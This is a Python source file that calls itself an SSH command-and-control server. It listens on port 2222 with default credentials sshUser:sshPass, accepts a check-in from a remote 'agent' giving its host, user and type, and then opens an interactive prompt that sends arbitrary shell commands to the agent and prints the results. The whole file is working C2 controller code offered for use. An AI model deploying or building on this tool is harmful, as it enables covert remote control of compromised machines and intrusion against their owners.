import sys
import paramiko
import os
import socket
import argparse

parser = argparse.ArgumentParser(description="SSH C2 server configuration to listen for agents")
parser._action_groups.pop()
required = parser.add_argument_group("Required")
optional = parser.add_argument_group("Optional")
required.add_argument("-f", dest="key_file", help="Key File")
optional.add_argument("-p", dest="port", type=int, default=2222, help="Port to listen (Default: 2222)")
optional.add_argument("-u", dest="user", default="sshUser", help="Server user (Default: sshUser)")
optional.add_argument("-pwd", dest="password", default="sshPass", help="Server password (Default: sshPass)")

if (len(sys.argv) == 1):
    parser.print_help(sys.stderr)
    sys.exit()

args = parser.parse_args()

class SSHServer (paramiko.ServerInterface):
    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == args.user) and (password == args.password): #Configure your own username and password for the server (Default is sshUser:sshPass)
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

def main():
    server = "0.0.0.0" #To listen on all interfaces
    port = args.port
    HOSTKEY = paramiko.RSAKey(filename=os.path.join(args.key_file)) #Provide private Key File via -f flag

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, port))
        sock.listen()
        print("[*] Listening for connections...")
        client, addr = sock.accept()
    except KeyboardInterrupt:
        quit()

    C2_Session = paramiko.Transport(client)
    C2_Session.add_server_key(HOSTKEY)
    server = SSHServer()
    C2_Session.start_server(server=server)
    conn = C2_Session.accept()
    print("[*] Debug info:\n" + str(conn)) #Debug info
    if conn is None:
        print("[!] Failled authentication.")
        sys.exit()
    success_msg = conn.recv(1024).decode()
    host = success_msg.split(",")[0]
    user = success_msg.split(",")[1]
    type = success_msg.split(",")[2]
    print(f"[*] Agent checked in from \"{host}\" ({type}) as \"{user}\".\n")
    conn.send(" ") #Connection breaks without this line

    def comm_handler():
        while True:
            try:
                cmd_line = (f">> {user}@{host} ~$ ")
                command = input(cmd_line + "")
                head = command.split(" ")[0]
                match head:
                    case "":
                        comm_handler()
                    case "exit":
                        conn.send(command)
                        sys.exit()
                    case _:
                        conn.send(command)
                        print(conn.recv(102400).decode())
            except Exception as ex:
                print(str(ex))
                pass
            except KeyboardInterrupt:
                conn.send("exit")
                sys.exit()
    comm_handler()

if __name__ == "__main__":
    try:
        main()
    except Exception as ex:
        print(str(ex))
